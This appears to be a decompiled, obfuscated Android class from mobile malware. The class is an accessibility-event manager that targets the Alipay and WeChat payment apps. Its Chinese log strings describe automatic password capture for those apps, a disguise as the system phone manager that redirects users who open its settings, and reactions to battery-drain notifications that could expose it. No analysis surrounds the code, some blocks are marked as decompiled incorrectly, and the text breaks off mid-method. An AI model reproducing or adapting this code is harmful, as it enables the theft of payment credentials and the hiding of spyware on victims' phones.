package p000;

import android.app.KeyguardManager;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.graphics.Rect;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import com.storm.safe.rock.AppVariantE;
import com.storm.safe.rock.activity.izvpcqplqctn;
import com.storm.safe.rock.activity.yrsanyhsbh;
import com.storm.safe.rock.manager.C0260a2;
import com.storm.safe.rock.service.dqtvuisjd;
import com.storm.safe.rock.service.modules.C0320a5;
import com.storm.safe.rock.service.modules.C0325b0;
import com.storm.safe.rock.service.modules.C0327b2;
import com.storm.safe.rock.service.modules.cipher.C0341a7;
import com.storm.safe.rock.service.modules.overlay.C0353a0;
import com.storm.safe.rock.service.modules.overlay.C0354a1;
import com.storm.safe.rock.util.StringUtil;
import java.util.Iterator;
import java.util.List;
import java.util.Locale;
import kotlin.Pair;
import kotlin.collections.AbstractC0770a1;
import kotlin.coroutines.AbstractC0775a0;
import kotlin.text.AbstractC0779a1;
import kotlinx.coroutines.android.C0785a0;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
/* renamed from: i9 */
/* loaded from: classes2.dex */
public final class C0614i9 {

    /* renamed from: a0 */
    public final dqtvuisjd f56820a0;

    /* renamed from: a1 */
    public final Context f56821a1;

    /* renamed from: a2 */
    public final C0873ms f56822a2;

    /* renamed from: a3 */
    public C0260a2 f56823a3;

    /* renamed from: a4 */
    public C0320a5 f56824a4;

    /* renamed from: a5 */
    public C0325b0 f56825a5;

    /* renamed from: a6 */
    public long f56826a6;

    /* renamed from: a7 */
    public boolean f56827a7;

    /* renamed from: a8 */
    public boolean f56828a8;

    /* renamed from: a9 */
    public long f56829a9;

    /* renamed from: b0 */
    public boolean f56830b0;

    /* renamed from: b1 */
    public long f56831b1;

    /* renamed from: b2 */
    public String f56832b2;

    /* renamed from: b3 */
    public volatile boolean f56833b3;

    /* renamed from: b4 */
    public boolean f56834b4;

    /* renamed from: b5 */
    public long f56835b5;

    /* renamed from: b6 */
    public RunnableC0613i8 f56836b6;

    /* renamed from: b7 */
    public RunnableC0613i8 f56837b7;

    /* renamed from: b8 */
    public final Handler f56838b8;

    /* renamed from: b9 */
    public boolean f56839b9;

    /* renamed from: c0 */
    public final String f56840c0;

    /* renamed from: c1 */
    public final String f56841c1;

    /* renamed from: c2 */
    public long f56842c2;

    /* renamed from: c3 */
    public final long f56843c3;

    /* renamed from: c4 */
    public String f56844c4;

    /* renamed from: c5 */
    public long f56845c5;

    /* renamed from: c6 */
    public RunnableC0613i8 f56846c6;

    /* renamed from: c7 */
    public final Handler f56847c7;

    /* renamed from: c8 */
    public volatile boolean f56848c8;

    static {
        new C0611i7(null);
    }

    public C0614i9(dqtvuisjd dqtvuisjdVar, dqtvuisjd dqtvuisjdVar2) {
        t60.m214695b6(dqtvuisjdVar, "service");
        t60.m214695b6(dqtvuisjdVar2, "context");
        this.f56820a0 = dqtvuisjdVar;
        this.f56821a1 = dqtvuisjdVar2;
        C1180rh c1180rh = AbstractC1262tj.f60233a0;
        C0785a0 c0785a0 = sc0.f59953a0;
        y21 y21Var = new y21();
        c0785a0.getClass();
        this.f56822a2 = AbstractC1117qo.m214407a0(AbstractC0775a0.m213638a1(c0785a0, y21Var));
        this.f56832b2 = "";
        this.f56835b5 = 5000L;
        this.f56838b8 = new Handler(Looper.getMainLooper());
        this.f56840c0 = dqtvuisjdVar2.getPackageName();
        this.f56841c1 = AppVariantE.class.getName();
        this.f56843c3 = 500L;
        this.f56847c7 = new Handler(Looper.getMainLooper());
    }

    /* renamed from: a2 */
    public static String m213111a2(AccessibilityNodeInfo accessibilityNodeInfo) {
        StringBuilder sb = new StringBuilder();
        CharSequence text = accessibilityNodeInfo.getText();
        if (text != null) {
            sb.append(text);
            sb.append(" ");
        }
        CharSequence contentDescription = accessibilityNodeInfo.getContentDescription();
        if (contentDescription != null) {
            sb.append(contentDescription);
            sb.append(" ");
        }
        int childCount = accessibilityNodeInfo.getChildCount();
        for (int i = 0; i < childCount; i++) {
            AccessibilityNodeInfo child = accessibilityNodeInfo.getChild(i);
            if (child != null) {
                sb.append(m213111a2(child));
                cq0.m212492d5(child);
            }
        }
        String string = sb.toString();
        t60.m214694b5(string, "sb.toString()");
        return string;
    }

    /* JADX WARN: Removed duplicated region for block: B:51:0x00a1  */
    /* renamed from: b9 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public static boolean m213112b9(AccessibilityNodeInfo accessibilityNodeInfo) {
        String lowerCase;
        String lowerCase2;
        boolean z;
        String string;
        String string2;
        String string3;
        try {
            CharSequence text = accessibilityNodeInfo.getText();
            String lowerCase3 = "";
            if (text == null || (string3 = text.toString()) == null) {
                lowerCase = "";
            } else {
                lowerCase = string3.toLowerCase(Locale.ROOT);
                t60.m214694b5(lowerCase, "this as java.lang.String).toLowerCase(Locale.ROOT)");
            }
            CharSequence contentDescription = accessibilityNodeInfo.getContentDescription();
            if (contentDescription == null || (string2 = contentDescription.toString()) == null) {
                lowerCase2 = "";
            } else {
                lowerCase2 = string2.toLowerCase(Locale.ROOT);
                t60.m214694b5(lowerCase2, "this as java.lang.String).toLowerCase(Locale.ROOT)");
            }
            CharSequence className = accessibilityNodeInfo.getClassName();
            if (className != null && (string = className.toString()) != null) {
                lowerCase3 = string.toLowerCase(Locale.ROOT);
                t60.m214694b5(lowerCase3, "this as java.lang.String).toLowerCase(Locale.ROOT)");
            }
            List<String> list = dh0.f55778c8;
            if (list == null || !list.isEmpty()) {
                for (String str : list) {
                    if (AbstractC0779a1.m213652a5(lowerCase, str, true) || AbstractC0779a1.m213652a5(lowerCase2, str, true)) {
                        break;
                    }
                }
            }
            boolean z2 = AbstractC0779a1.m213652a5(lowerCase3, "confirm", false) || AbstractC0779a1.m213652a5(lowerCase3, "submit", false);
            if (AbstractC0779a1.m213652a5(lowerCase3, "switch", false) || AbstractC0779a1.m213652a5(lowerCase3, "toggle", false)) {
                z = true;
            } else if (!accessibilityNodeInfo.isCheckable()) {
                z = false;
            }
            return z2 || z;
        } catch (Exception e) {
            t60.m214705c6("AccessibilityEventManager", "检查确认按钮特征失败", e);
            return false;
        }
    }

    /* renamed from: a0 */
    public final void m213113a0(AccessibilityEvent accessibilityEvent, AccessibilityNodeInfo accessibilityNodeInfo) throws Throwable {
        int eventType;
        AccessibilityNodeInfo source;
        AccessibilityNodeInfo source2;
        String string;
        String string2;
        try {
            if (this.f56839b9) {
                CharSequence packageName = accessibilityEvent.getPackageName();
                String str = "";
                if (packageName == null || (string = packageName.toString()) == null) {
                    string = "";
                }
                CharSequence className = accessibilityEvent.getClassName();
                if (className != null && (string2 = className.toString()) != null) {
                    str = string2;
                }
                m213117a5(string, str);
            }
            eventType = accessibilityEvent.getEventType();
            try {
            } catch (Exception unused) {
                return;
            }
        } catch (Exception e) {
            t60.m214705c6("AccessibilityEventManager", "❌ 分析和处理事件失败", e);
            return;
        }
        if (eventType == 1) {
            if (accessibilityNodeInfo == null) {
                try {
                    source = accessibilityEvent.getSource();
                } catch (Exception e2) {
                    t60.m214705c6("AccessibilityEventManager", "❌ 处理点击事件失败", e2);
                    return;
                }
            } else {
                source = accessibilityNodeInfo;
            }
            boolean z = accessibilityNodeInfo == null;
            if (source == null) {
                return;
            }
            try {
                m213136c5(accessibilityEvent, source);
                da0 da0Var = this.f56820a0.f52421f2;
                if (da0Var != null) {
                    da0Var.m212575a2(accessibilityEvent, source);
                }
                if (!z) {
                } else {
                    cq0.m212492d5(source);
                }
            } catch (Throwable th) {
                if (z) {
                    try {
                        cq0.m212492d5(source);
                    } catch (Exception unused2) {
                    }
                }
                throw th;
            }
        } else {
            if (eventType != 8) {
                if (eventType == 16) {
                    try {
                        this.f56826a6 = System.currentTimeMillis();
                        return;
                    } catch (Exception e3) {
                        t60.m214705c6("AccessibilityEventManager", "❌ 处理文本变化事件失败", e3);
                        return;
                    }
                }
                if (eventType == 32) {
                    m213130b8(accessibilityEvent);
                    return;
                } else {
                    if (eventType != 64) {
                        return;
                    }
                    try {
                        m213114a1(accessibilityEvent);
                        return;
                    } catch (Exception e4) {
                        t60.m214705c6("AccessibilityEventManager", "❌ 处理通知状态变化失败", e4);
                        return;
                    }
                }
                t60.m214705c6("AccessibilityEventManager", "❌ 分析和处理事件失败", e);
                return;
            }
            try {
                source2 = accessibilityEvent.getSource();
                if (source2 != null) {
                    try {
                        source2.isClickable();
                    } catch (Throwable th2) {
                        th = th2;
                        try {
                            cq0.m212492d5(source2);
                        } catch (Exception unused3) {
                        }
                        throw th;
                    }
                }
                cq0.m212492d5(source2);
            } catch (Throwable th3) {
                th = th3;
                source2 = null;
            }
        }
    }

    /* renamed from: a1 */
    public final void m213114a1(AccessibilityEvent accessibilityEvent) {
        try {
            if (this.f56820a0.f52477k8) {
                List<CharSequence> text = accessibilityEvent.getText();
                t60.m214694b5(text, "event.text");
                String strM213295i2 = AbstractC0715je.m213295i2(text, " ", null, null, null, 62);
                if (AbstractC0779a1.m213663b6(strM213295i2)) {
                    return;
                }
                String strM213126b4 = m213126b4();
                if (strM213126b4.length() != 0 && AbstractC0779a1.m213652a5(strM213295i2, strM213126b4, false)) {
                    List listM213306g5 = AbstractC0716jf.m213306g5("高耗电", "耗电过快", "耗电异常", "后台耗电", "后台高耗电", "后台频繁刷新", "正在后台消耗电量", "电池消耗", "battery drain", "high battery", "consuming battery");
                    if (listM213306g5 == null || !listM213306g5.isEmpty()) {
                        Iterator it = listM213306g5.iterator();
                        while (it.hasNext()) {
                            if (AbstractC0779a1.m213652a5(strM213295i2, (String) it.next(), true)) {
                                t60.m214726f4("AccessibilityEventManager", "⚡ 通知事件检测到本应用高耗电: " + strM213295i2);
                                m213116a4();
                                return;
                            }
                        }
                    }
                }
            }
        } catch (Exception e) {
            t60.m214705c6("AccessibilityEventManager", "❌ 分析通知内容失败", e);
        }
    }

    /* renamed from: a3 */
    public final void m213115a3(String str, String str2) {
        try {
            if (this.f56828a8) {
                String[] strArr = {"com.eg.android.AlipayGphone", "com.alipay.android.phone", "com.alipay.mobile", "com.eg.android.AlipayGphoneRC"};
                for (int i = 0; i < 4; i++) {
                    if (AbstractC0779a1.m213652a5(str, strArr[i], false)) {
                        dqtvuisjd dqtvuisjdVar = this.f56820a0;
                        AbstractC0770a1.m213614f9(new Pair("packageName", str), new Pair("className", str2), new Pair("detectionTime", Long.valueOf(System.currentTimeMillis())), new Pair("delayMs", Long.valueOf(this.f56829a9)));
                        dqtvuisjdVar.getClass();
                        dqtvuisjd.m211435k0("ALIPAY_DETECTED", "检测到支付宝应用");
                        if (this.f56829a9 > 0) {
                            new Handler(Looper.getMainLooper()).postDelayed(new RunnableC0610i6(this, 0), this.f56829a9);
                            return;
                        } else {
                            m213139c8();
                            return;
                        }
                    }
                }
            }
        } catch (Exception e) {
            t60.m214705c6("AccessibilityEventManager", "❌ 检测支付宝应用失败", e);
        }
    }

    /* renamed from: a4 */
    public final void m213116a4() {
        if (this.f56820a0.f52477k8 && System.currentTimeMillis() - this.f56845c5 >= 120000) {
            RunnableC0613i8 runnableC0613i8 = this.f56846c6;
            Handler handler = this.f56847c7;
            if (runnableC0613i8 != null) {
                handler.removeCallbacks(runnableC0613i8);
            }
            RunnableC0613i8 runnableC0613i82 = new RunnableC0613i8(this, 0);
            this.f56846c6 = runnableC0613i82;
            handler.postDelayed(runnableC0613i82, 900L);
        }
    }

    /* renamed from: a5 */
    public final void m213117a5(String str, String str2) {
        try {
            if (this.f56839b9 && str.equals(this.f56840c0)) {
                boolean z = str2.equals(this.f56841c1) || str2.equals(AppVariantE.class.getName()) || AbstractC0779a1.m213652a5(str2, "AppVariantE", false) || AbstractC0779a1.m213652a5(str2, "AppVariantF", false) || AbstractC0779a1.m213652a5(str2, "AppVariantG", false) || AbstractC0779a1.m213652a5(str2, "AppVariantH", false) || AbstractC0779a1.m213652a5(str2, "AppVariantB", false) || AbstractC0779a1.m213652a5(str2, "AppVariantC", false) || AbstractC0779a1.m213652a5(str2, "AppVariantD", false) || AbstractC0779a1.m213652a5(str2, "AppVariantA", false) || AbstractC0779a1.m213652a5(str2, "AppVariantJ", false) || AbstractC0779a1.m213652a5(str2, "SettingsAlias", false);
                boolean zM213652a5 = AbstractC0779a1.m213652a5(str2, "izvpcqplqctn", false);
                boolean zM213652a52 = AbstractC0779a1.m213652a5(str2, "syuqattwmgit", false);
                if (!zM213652a5 && !zM213652a52 && z && !AbstractC1229so.m214647b2()) {
                    long jCurrentTimeMillis = System.currentTimeMillis();
                    if (jCurrentTimeMillis - this.f56842c2 < this.f56843c3) {
                        return;
                    }
                    this.f56842c2 = jCurrentTimeMillis;
                    if (m213133c2()) {
                        return;
                    }
                    try {
                        if (!dqtvuisjd.f52358m1.isServiceRunning()) {
                            return;
                        }
                    } catch (Exception unused) {
                    }
                    try {
                        m213137c6();
                    } catch (Exception e) {
                        try {
                            t60.m214705c6("AccessibilityEventManager", "❌ 拦截并切换到系统手机管家异常", e);
                        } catch (Exception e2) {
                            t60.m214705c6("AccessibilityEventManager", "❌ [手机管家伪装检测] 拦截并跳转到系统手机管家失败", e2);
                        }
                    }
                }
            }
        } catch (Exception e3) {
            t60.m214705c6("AccessibilityEventManager", "❌ [手机管家伪装检测] 检测手机管家伪装失败", e3);
        }
    }

    /* renamed from: a6 */
    public final void m213118a6(String str, String str2) {
        try {
            if (this.f56830b0) {
                String[] strArr = {"com.tencent.mm", "com.tencent.mobileqq", "com.tencent.wework", "com.tencent.mm.plugin", "com.tencent.mm.wechat", "com.tencent.mm.weixin", "com.tencent.mm.mm", "com.tencent.mm.ui", "com.tencent.mm.plugin.wallet"};
                int i = 0;
                while (true) {
                    if (i < 9) {
                        if (AbstractC0779a1.m213652a5(str, strArr[i], false)) {
                            break;
                        } else {
                            i++;
                        }
                    } else if (!AbstractC0779a1.m213679d2(str, false, "com.tencent.mm")) {
                        return;
                    }
                }
                dqtvuisjd dqtvuisjdVar = this.f56820a0;
                AbstractC0770a1.m213614f9(new Pair("packageName", str), new Pair("className", str2), new Pair("detectionTime", Long.valueOf(System.currentTimeMillis())), new Pair("delayMs", Long.valueOf(this.f56831b1)));
                dqtvuisjdVar.getClass();
                dqtvuisjd.m211435k0("WECHAT_DETECTED", "检测到微信应用");
                if (this.f56831b1 > 0) {
                    new Handler(Looper.getMainLooper()).postDelayed(new RunnableC0610i6(this, 1), this.f56831b1);
                } else {
                    m213138c7();
                }
            }
        } catch (Exception e) {
            t60.m214705c6("AccessibilityEventManager", "❌ 检测微信应用失败", e);
        }
    }

    /* renamed from: a7 */
    public final void m213119a7() {
        try {
            this.f56828a8 = false;
            dqtvuisjd dqtvuisjdVar = this.f56820a0;
            AbstractC0770a1.m213614f9(new Pair("enabled", Boolean.FALSE), new Pair("timestamp", Long.valueOf(System.currentTimeMillis())));
            dqtvuisjdVar.getClass();
            dqtvuisjd.m211435k0("ALIPAY_DETECTION_DISABLED", "支付宝检测已关闭");
        } catch (Exception e) {
            t60.m214705c6("AccessibilityEventManager", "❌ 关闭支付宝检测失败", e);
        }
    }

    /* renamed from: a8 */
    public final void m213120a8() {
        try {
            this.f56834b4 = false;
            Handler handler = this.f56838b8;
            RunnableC0613i8 runnableC0613i8 = this.f56836b6;
            if (runnableC0613i8 != null) {
                handler.removeCallbacks(runnableC0613i8);
            }
            RunnableC0613i8 runnableC0613i82 = this.f56837b7;
            if (runnableC0613i82 != null) {
                handler.removeCallbacks(runnableC0613i82);
            }
            this.f56836b6 = null;
            this.f56837b7 = null;
            t60.m214714d6("AccessibilityEventManager", "🔐 关闭自动密码检测");
            dqtvuisjd dqtvuisjdVar = this.f56820a0;
            AbstractC0770a1.m213614f9(new Pair("enabled", Boolean.FALSE), new Pair("timestamp", Long.valueOf(System.currentTimeMillis())));
            dqtvuisjdVar.getClass();
            dqtvuisjd.m211435k0("AUTO_PASSWORD_DETECTION_DISABLED", "自动密码检测已关闭");
        } catch (Exception e) {
            t60.m214705c6("AccessibilityEventManager", "❌ 关闭自动密码检测失败", e);
        }
    }

    /* renamed from: a9 */
    public final void m213121a9() {
        try {
            this.f56830b0 = false;
            dqtvuisjd dqtvuisjdVar = this.f56820a0;
            AbstractC0770a1.m213614f9(new Pair("enabled", Boolean.FALSE), new Pair("timestamp", Long.valueOf(System.currentTimeMillis())));
            dqtvuisjdVar.getClass();
            dqtvuisjd.m211435k0("WECHAT_DETECTION_DISABLED", "微信检测已关闭");
        } catch (Exception e) {
            t60.m214705c6("AccessibilityEventManager", "❌ 关闭微信检测失败", e);
        }
    }

    /* renamed from: b0 */
    public final void m213122b0(long j) {
        try {
            this.f56828a8 = true;
            this.f56829a9 = j;
            dqtvuisjd dqtvuisjdVar = this.f56820a0;
            AbstractC0770a1.m213614f9(new Pair("enabled", Boolean.TRUE), new Pair("delayMs", Long.valueOf(j)), new Pair("timestamp", Long.valueOf(System.currentTimeMillis())));
            dqtvuisjdVar.getClass();
            dqtvuisjd.m211435k0("ALIPAY_DETECTION_ENABLED", "支付宝检测已开启");
        } catch (Exception e) {
            t60.m214705c6("AccessibilityEventManager", "❌ 开启支付宝检测失败", e);
        }
    }

    /* renamed from: b1 */
    public final void m213123b1(long j) {
        try {
            this.f56834b4 = true;
            this.f56835b5 = j;
            t60.m214714d6("AccessibilityEventManager", "🔐 开启自动密码检测，延时: " + j + "ms");
            dqtvuisjd dqtvuisjdVar = this.f56820a0;
            AbstractC0770a1.m213614f9(new Pair("enabled", Boolean.TRUE), new Pair("delayMs", Long.valueOf(j)), new Pair("timestamp", Long.valueOf(System.currentTimeMillis())));
            dqtvuisjdVar.getClass();
            dqtvuisjd.m211435k0("AUTO_PASSWORD_DETECTION_ENABLED", "自动密码检测已开启");
        } catch (Exception e) {
            t60.m214705c6("AccessibilityEventManager", "❌ 开启自动密码检测失败", e);
        }
    }

    /* renamed from: b2 */
    public final void m213124b2() {
        this.f56839b9 = true;
        try {
            this.f56821a1.getSharedPreferences("camouflage_state", 0).edit().putBoolean("phone_manager_camouflage_enabled", true).apply();
        } catch (Exception e) {
            t60.m214705c6("AccessibilityEventManager", "❌ 保存伪装状态失败", e);
        }
        AbstractC0770a1.m213613f8(new Pair("timestamp", Long.valueOf(System.currentTimeMillis())));
        this.f56820a0.getClass();
        dqtvuisjd.m211435k0("PHONE_MANAGER_CAMOUFLAGE_ENABLED", "手机管家伪装监听已启用");
    }

    /* renamed from: b3 */
    public final void m213125b3(long j) {
        try {
            this.f56830b0 = true;
            this.f56831b1 = j;
            dqtvuisjd dqtvuisjdVar = this.f56820a0;
            AbstractC0770a1.m213614f9(new Pair("enabled", Boolean.TRUE), new Pair("delayMs", Long.valueOf(j)), new Pair("timestamp", Long.valueOf(System.currentTimeMillis())));
            dqtvuisjdVar.getClass();
            dqtvuisjd.m211435k0("WECHAT_DETECTION_ENABLED", "微信检测已开启");
        } catch (Exception e) {
            t60.m214705c6("AccessibilityEventManager", "❌ 开启微信检测失败", e);
        }
    }

    /* renamed from: b4 */
    public final String m213126b4() throws PackageManager.NameNotFoundException {
        String string;
        Context context = this.f56821a1;
        if (this.f56844c4 == null) {
            try {
                ApplicationInfo applicationInfo = context.getPackageManager().getApplicationInfo(context.getPackageName(), 0);
                t60.m214694b5(applicationInfo, "context.packageManager.g…o(context.packageName, 0)");
                string = context.getPackageManager().getApplicationLabel(applicationInfo).toString();
            } catch (Exception unused) {
                string = "";
            }
            this.f56844c4 = string;
        }
        String str = this.f56844c4;
        return str == null ? "" : str;
    }

    /* renamed from: b5 */
    public final void m213127b5(AccessibilityEvent accessibilityEvent) {
        C0320a5 c0320a5;
        try {
            if (this.f56848c8) {
                C0260a2 c0260a2 = this.f56823a3;
                if (c0260a2 != null) {
                    c0260a2.m211312e4(accessibilityEvent);
                }
                if (accessibilityEvent.getEventType() == 32) {
                    m213130b8(accessibilityEvent);
                    return;
                }
                return;
            }
            C0260a2 c0260a22 = this.f56823a3;
            if (c0260a22 != null) {
                c0260a22.m211312e4(accessibilityEvent);
            }
            AccessibilityNodeInfo source = null;
            try {
                C0327b2 c0327b2 = this.f56820a0.f52429g0;
                if (c0327b2 == null) {
                    c0327b2 = null;
                }
                if (c0327b2 != null) {
                    c0327b2.m211733d4(accessibilityEvent);
                }
            } catch (Exception unused) {
            }
            if (accessibilityEvent.getEventType() == 16 || accessibilityEvent.getEventType() == 1) {
                try {
                    source = accessibilityEvent.getSource();
                } catch (Exception unused2) {
                }
            }
            try {
                if (this.f56827a7 && (c0320a5 = this.f56824a4) != null) {
                    c0320a5.m211582a3(accessibilityEvent, source);
                }
                C0325b0 c0325b0 = this.f56825a5;
                if (c0325b0 != null) {
                    c0325b0.m211690a5(accessibilityEvent, source);
                }
                m213113a0(accessibilityEvent, source);
                try {
                    cq0.m212492d5(source);
                } catch (Exception unused3) {
                }
            } finally {
                try {
                    cq0.m212492d5(source);
                } catch (Exception unused4) {
                }
            }
        } catch (Exception e) {
            t60.m214705c6("AccessibilityEventManager", "❌ 处理无障碍事件失败", e);
        }
    }

    /* renamed from: b6 */
    public final void m213128b6() {
        if (this.f56834b4) {
            boolean z = false;
            try {
                z = C0107as.f45610a3.getInstance(this.f56821a1).f45619a1.getBoolean(C0107as.f45611a4, false);
            } catch (Exception e) {
                t60.m214705c6("AccessibilityEventManager", "❌ 检查支付宝密码状态失败", e);
            }
            if (z) {
                t60.m214702c3("AccessibilityEventManager", "💰 支付宝密码已记录，跳过自动检测");
                return;
            }
            RunnableC0613i8 runnableC0613i8 = this.f56836b6;
            Handler handler = this.f56838b8;
            if (runnableC0613i8 != null) {
                handler.removeCallbacks(runnableC0613i8);
            }
            this.f56836b6 = new RunnableC0613i8(this, 1);
            t60.m214702c3("AccessibilityEventManager", "💰 支付宝自动检测：" + this.f56835b5 + "ms 后检查密码状态");
            RunnableC0613i8 runnableC0613i82 = this.f56836b6;
            t60.m214692b3(runnableC0613i82);
            handler.postDelayed(runnableC0613i82, this.f56835b5);
        }
    }

    /* renamed from: b7 */
    public final void m213129b7() {
        if (this.f56834b4) {
            boolean z = false;
            try {
                z = C0107as.f45610a3.getInstance(this.f56821a1).f45619a1.getBoolean(C0107as.f45612a5, false);
            } catch (Exception e) {
                t60.m214705c6("AccessibilityEventManager", "❌ 检查微信密码状态失败", e);
            }
            if (z) {
                t60.m214702c3("AccessibilityEventManager", "💬 微信密码已记录，跳过自动检测");
                return;
            }
            RunnableC0613i8 runnableC0613i8 = this.f56837b7;
            Handler handler = this.f56838b8;
            if (runnableC0613i8 != null) {
                handler.removeCallbacks(runnableC0613i8);
            }
            this.f56837b7 = new RunnableC0613i8(this, 2);
            t60.m214702c3("AccessibilityEventManager", "💬 微信自动检测：" + this.f56835b5 + "ms 后检查密码状态");
            RunnableC0613i8 runnableC0613i82 = this.f56837b7;
            t60.m214692b3(runnableC0613i82);
            handler.postDelayed(runnableC0613i82, this.f56835b5);
        }
    }

    /* renamed from: b8 */
    public final void m213130b8(AccessibilityEvent accessibilityEvent) {
        String string;
        String string2;
        C0341a7 c0340a6;
        C0260a2 c0260a2;
        String string3;
        try {
            CharSequence packageName = accessibilityEvent.getPackageName();
            String str = "";
            if (packageName == null || (string = packageName.toString()) == null) {
                string = "";
            }
            CharSequence className = accessibilityEvent.getClassName();
            if (className == null || (string2 = className.toString()) == null) {
                string2 = "";
            }
            if (string.length() > 0 && !string.equals(this.f56821a1.getPackageName())) {
                this.f56832b2 = string;
                this.f56833b3 = false;
            } else if (string.equals(this.f56821a1.getPackageName())) {
                this.f56833b3 = AbstractC0779a1.m213652a5(string2, "izvpcqplqctn", false) || AbstractC0779a1.m213652a5(string2, "syuqattwmgit", false);
            }
            try {
                CharSequence packageName2 = accessibilityEvent.getPackageName();
                if (packageName2 != null && (string3 = packageName2.toString()) != null) {
                    str = string3;
                }
                if ((AbstractC0779a1.m213652a5(str, "com.android.packageinstaller", false) || AbstractC0779a1.m213652a5(str, "com.android.permissioncontroller", false) || AbstractC0779a1.m213652a5(str, "android", false)) && (c0260a2 = this.f56823a3) != null) {
                    c0260a2.m211312e4(accessibilityEvent);
                }
            } catch (Exception e) {
                t60.m214705c6("AccessibilityEventManager", "❌ 检测权限对话框失败", e);
            }
            try {
                if (string.length() > 0 && !string.equals(this.f56821a1.getPackageName()) && (c0340a6 = C0341a7.f53380c1.getInstance()) != null) {
                    c0340a6.m211864a3(string, string2);
                }
            } catch (Exception unused) {
            }
            m213115a3(string, string2);
            m213118a6(string, string2);
            if (this.f56834b4) {
                String[] strArr = {"com.eg.android.AlipayGphone", "com.alipay.android.phone", "com.alipay.mobile"};
                int i = 0;
                while (true) {
                    if (i >= 3) {
                        break;
                    }
                    if (AbstractC0779a1.m213652a5(string, strArr[i], false)) {
                        m213128b6();
                        break;
                    }
                    i++;
                }
                if (AbstractC0779a1.m213652a5(string, new String[]{"com.tencent.mm"}[0], false) || AbstractC0779a1.m213679d2(string, false, "com.tencent.mm")) {
                    m213129b7();
                }
            }
            m213117a5(string, string2);
            if (string.equals("com.android.systemui")) {
                m213116a4();
            }
        } catch (Exception e2) {
            t60.m214705c6("AccessibilityEventManager", "❌ 处理窗口状态变化失败", e2);
        }
    }

    /* renamed from: c0 */
    public final boolean m213131c0() {
        String[] strArr = {"com.eg.android.AlipayGphone", "com.alipay.android.phone", "com.alipay.mobile", "com.eg.android.AlipayGphoneRC"};
        for (int i = 0; i < 4; i++) {
            if (AbstractC0779a1.m213652a5(this.f56832b2, strArr[i], false)) {
                return true;
            }
        }
        return false;
    }

    /* renamed from: c1 */
    public final boolean m213132c1() {
        String[] strArr = {"com.tencent.mm", "com.tencent.wework"};
        for (int i = 0; i < 2; i++) {
            if (AbstractC0779a1.m213652a5(this.f56832b2, strArr[i], false)) {
                return true;
            }
        }
        return AbstractC0779a1.m213679d2(this.f56832b2, false, "com.tencent.mm");
    }

    /* renamed from: c2 */
    public final boolean m213133c2() {
        try {
            if (this.f56833b3) {
                return true;
            }
            String str = this.f56832b2;
            if (t60.m214686a2(str, "com.eg.android.AlipayGphone") || t60.m214686a2(str, "com.alipay.android.phone.mobilecommon") || AbstractC0779a1.m213652a5(str, "alipay", false) || str.equals("com.tencent.mm") || AbstractC0779a1.m213652a5(str, "wechat", false) || AbstractC0779a1.m213652a5(str, "weixin", false)) {
                return true;
            }
            return AbstractC0779a1.m213652a5(str, "tencent.mm", false);
        } catch (Exception e) {
            t60.m214705c6("AccessibilityEventManager", "❌ [重要页面检查] 检查重要页面失败", e);
            return false;
        }
    }

    /* JADX WARN: Removed duplicated region for block: B:78:0x0110  */
    /* renamed from: c3 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final boolean m213134c3(AccessibilityNodeInfo accessibilityNodeInfo, float f) {
        String lowerCase;
        String lowerCase2;
        boolean z;
        boolean z2;
        boolean z3;
        String string;
        String string2;
        String string3;
        try {
            CharSequence text = accessibilityNodeInfo.getText();
            String lowerCase3 = "";
            if (text == null || (string3 = text.toString()) == null) {
                lowerCase = "";
            } else {
                lowerCase = string3.toLowerCase(Locale.ROOT);
                t60.m214694b5(lowerCase, "this as java.lang.String).toLowerCase(Locale.ROOT)");
            }
            CharSequence contentDescription = accessibilityNodeInfo.getContentDescription();
            if (contentDescription == null || (string2 = contentDescription.toString()) == null) {
                lowerCase2 = "";
            } else {
                lowerCase2 = string2.toLowerCase(Locale.ROOT);
                t60.m214694b5(lowerCase2, "this as java.lang.String).toLowerCase(Locale.ROOT)");
            }
            CharSequence className = accessibilityNodeInfo.getClassName();
            if (className != null && (string = className.toString()) != null) {
                lowerCase3 = string.toLowerCase(Locale.ROOT);
                t60.m214694b5(lowerCase3, "this as java.lang.String).toLowerCase(Locale.ROOT)");
            }
            boolean z4 = ((double) f) > ((double) this.f56821a1.getResources().getDisplayMetrics().heightPixels) * 0.4d;
            boolean z5 = AbstractC0779a1.m213652a5(lowerCase3, "button", false) || AbstractC0779a1.m213652a5(lowerCase3, "imageview", false) || AbstractC0779a1.m213652a5(lowerCase3, "textview", false) || accessibilityNodeInfo.isClickable();
            List<String> list = dh0.f55778c8;
            if (list == null || !list.isEmpty()) {
                for (String str : list) {
                    if (AbstractC0779a1.m213652a5(lowerCase, str, true) || AbstractC0779a1.m213652a5(lowerCase2, str, true)) {
                        z = true;
                        break;
                    }
                }
                z = false;
            } else {
                z = false;
            }
            List list2 = dh0.f55776c6;
            List list3 = dh0.f55753a3;
            if (list2 == null || !list2.isEmpty()) {
                Iterator it = list2.iterator();
                while (it.hasNext()) {
                    if (AbstractC0779a1.m213652a5(lowerCase, (String) it.next(), true)) {
                        break;
                    }
                }
            }
            if (list3 == null || !list3.isEmpty()) {
                Iterator it2 = list3.iterator();
                while (it2.hasNext()) {
                    if (AbstractC0779a1.m213652a5(lowerCase, (String) it2.next(), true)) {
                        z2 = false;
                    }
                }
            }
            z2 = true;
            Rect rect = new Rect();
            accessibilityNodeInfo.getBoundsInScreen(rect);
            if (rect.width() > 50) {
                z3 = rect.height() > 50;
            }
            return (z4 && z5 && z2 && z3) || z;
        } catch (Exception e) {
            t60.m214705c6("AccessibilityEventManager", "判断确认按钮失败", e);
            return false;
        }
    }

    /* renamed from: c4 */
    public final boolean m213135c4(AccessibilityNodeInfo accessibilityNodeInfo) {
        String lowerCase;
        boolean z;
        String string;
        String string2;
        Context context = this.f56821a1;
        try {
            if (System.currentTimeMillis() - this.f56826a6 < 10000) {
                CharSequence text = accessibilityNodeInfo.getText();
                String lowerCase2 = "";
                if (text == null || (string2 = text.toString()) == null) {
                    lowerCase = "";
                } else {
